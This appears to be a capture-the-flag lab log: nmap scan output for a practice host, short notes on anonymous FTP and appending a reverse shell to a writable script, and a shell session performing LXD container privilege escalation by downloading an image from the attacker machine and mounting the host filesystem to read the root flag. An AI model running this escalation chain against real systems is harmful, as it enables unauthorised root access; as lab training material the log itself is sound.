@@ -1,0 +1,238 @@
+Discovered open port 21/tcp on 10.10.233.172
+Discovered open port 139/tcp on 10.10.233.172
+Discovered open port 22/tcp on 10.10.233.172
+Discovered open port 445/tcp on 10.10.233.172
+
+Reason: 65531 resets
+PORT    STATE SERVICE     REASON         VERSION
+21/tcp  open  ftp         syn-ack ttl 60 vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.18.24
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
+|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
+|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
+139/tcp open  netbios-ssn syn-ack ttl 60 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack ttl 60 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=10/19%OT=21%CT=1%CU=32865%PV=Y%DS=5%DC=T%G=Y%TM=616EAC
+OS:86%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
+OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Uptime guess: 18.211 days (since Fri Oct  1 11:57:23 2021)
+Network Distance: 5 hops
+TCP Sequence Prediction: Difficulty=252 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 3m39s, deviation: 0s, median: 3m38s
+| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   ANONYMOUS<00>        Flags: <unique><active>
+|   ANONYMOUS<03>        Flags: <unique><active>
+|   ANONYMOUS<20>        Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 11032/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 35194/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 61982/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 10546/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: anonymous
+|   NetBIOS computer name: ANONYMOUS\x00
+|   Domain name: \x00
+|   FQDN: anonymous
+|_  System time: 2021-10-19T11:34:50+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-19T11:34:50
+|_  start_date: N/A
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT       ADDRESS
+1   35.47 ms  10.17.0.1
+2   ... 4
+5   262.18 ms 10.10.233.172
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 17:01
+Completed NSE at 17:01, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 17:01
+Completed NSE at 17:01, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 17:01
+Completed NSE at 17:01, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incor https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1375.51 seco
+           Raw packets sent: 72092 (3.177MB) | Rcvd: 68469 
+           
+           
+           
+           
+ftp <ip> login with anonymous anonymous
+append the file with bash reverse shell code
+
+linpeas found lxd vulnerability
+
+
+
+
+
+
+$ wget http://10.17.18.24:8000/alpine-v3.14-i686-20211020_1954.tar.gz
+wget http://10.17.18.24:8000/alpine-v3.14-i686-20211020_1954.tar.gz
+--2021-10-20 14:31:17--  http://10.17.18.24:8000/alpine-v3.14-i686-20211020_1954.tar.gz
+Connecting to 10.17.18.24:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3282921 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.14-i686-20211020_1954.tar.gz’
+
+          alpine-v3   0%[                    ]       0  --.-KB/s              alpine-v3.   1%[                    ]  37.32K  95.2KB/s             alpine-v3.1   3%[                    ] 107.54K   162KB/s            alpine-v3.14   5%[>                   ] 162.29K   187KB/s           alpine-v3.14-   6%[>                   ] 217.03K   202KB/s          alpine-v3.14-i   9%[>                   ] 320.29K   249KB/s         alpine-v3.14-i6  17%[==>                 ] 576.59K   388KB/s        alpine-v3.14-i68  20%[===>                ] 668.65K   373KB/s       alpine-v3.14-i686  28%[====>               ] 913.75K   456KB/s      alpine-v3.14-i686-  33%[=====>              ]   1.06M   474KB/s     alpine-v3.14-i686-2  39%[======>             ]   1.24M   474KB/s     lpine-v3.14-i686-20  47%[========>           ]   1.50M   496KB/s    epine-v3.14-i686-202  55%[==========>         ]   1.75M   541KB/s    eine-v3.14-i686-2021  57%[==========>         ]   1.79M   523KB/s    ene-v3.14-i686-20211  63%[===========>        ]   2.00M   545KB/s    ee-v3.14-i686-202110  66%[============>       ]   2.07M   490KB/s    e-v3.14-i686-2021102  70%[=============>      ]   2.20M   473KB/s    ev3.14-i686-20211020  76%[==============>     ]   2.38M   490KB/s    e3.14-i686-20211020_  78%[==============>     ]   2.47M   502KB/s    e.14-i686-20211020_1  81%[===============>    ]   2.57M   509KB/s    e14-i686-20211020_19  84%[===============>    ]   2.66M   518KB/s    e4-i686-20211020_195  89%[================>   ]   2.80M   533KB/s    e-i686-20211020_1954  93%[=================>  ]   2.93M   541KB/s    ei686-20211020_1954.  97%[==================> ]   3.05M   554KB/s    ealpine-v3.14-i686-2 100%[===================>]   3.13M   569KB/s    in 6.4s    
+
+2021-10-20 14:31:24 (500 KB/s) - ‘alpine-v3.14-i686-20211020_1954.tar.gz’ saved [3282921/3282921]
+
+$ ls
+ls
+alpine-v3.14-i686-20211020_1954.tar.gz  linpeas.sh  pics  user.txt
+$ pwd
+pwd
+/home/namelessone
+$ lxc image import alpine-v3.14-i686-20211020_1954.tar.gz --alias alpine
+lxc image import alpine-v3.14-i686-20211020_1954.tar.gz --alias alpine
+$ lxc init alpine privesc -c security-privileged=true
+lxc init alpine privesc -c security-privileged=true
+Creating privesc
+Error: No storage pool found. Please create a new storage pool
+$ lxd init
+lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+
+Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
+yes
+Name of the new storage pool [default=default]: yes
+yes
+Name of the storage backend to use (btrfs, dir) [default=btrfs]: dir
+dir
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+
+What should the new bridge be called? [default=lxdbr0]: 
+
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
+none
+Would you like LXD to be available over the network? (yes/no) [default=no]: 
+
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+
+$ lxc init alpine privesc -c security-privileged=true
+lxc init alpine privesc -c security-privileged=true
+Creating privesc
+Error: Unknown configuration key: security-privileged
+$ lxc list
+lxc list
++------+-------+------+------+------+-----------+
+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
++------+-------+------+------+------+-----------+
+$ lxc image list
+lxc image list
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE          |
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+| alpine | a07716232b69 | no     | alpine v3.14 (20211020_19:54) | i686 | 3.13MB | Oct 20, 2021 at 2:33pm (UTC) |
++--------+--------------+--------+-------------------------------+------+--------+------------------------------+
+$ lxc init alpine privesc -c security.privileged=true
+lxc init alpine privesc -c security.privileged=true
+Creating privesc
+$ lxc config device add privesc host-root disk source=/ path=/mnt/root/
+lxc config device add privesc host-root disk source=/ path=/mnt/root/
+Device host-root added to privesc
+$ lxc start privesc
+lxc start privesc
+$ lxc exec privesc /bin/sh 
+lxc exec privesc /bin/sh
+~ # ^[[31;5Rwhoami
+whoami
+root
+~ # ^[[31;5Rcd /root
+cd /root
+~ # ^[[31;5Rls
+ls
+~ # ^[[31;5Rls -al
+ls -al
+total 12
+drwx------    2 root     root          4096 Oct 20 14:41 .
+drwxr-xr-x   19 root     root          4096 Oct 20 14:41 ..
+-rw-------    1 root     root            26 Oct 20 14:42 .ash_history
+~ # ^[[31;5Rcd /mnt/root
+cd /mnt/root
+/mnt/root # ^[[31;13Rls
+ls
+bin         etc         lost+found  proc        snap        tmp
+boot        home        media       root        srv         usr
+cdrom       lib         mnt         run         swap.img    var
+dev         lib64       opt         sbin        sys
+/mnt/root # ^[[31;13Rcd /root
+cd /root
+~ # ^[[31;5Rcd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # ^[[31;18Rls
+ls
+root.txt
+/mnt/root/root # ^[[31;18Rcat root.txt
+cat root.txt
+4d930091c31a622a7ed10f27999af363
+/mnt/root/root # ^[[31;18R
+          
+           
+
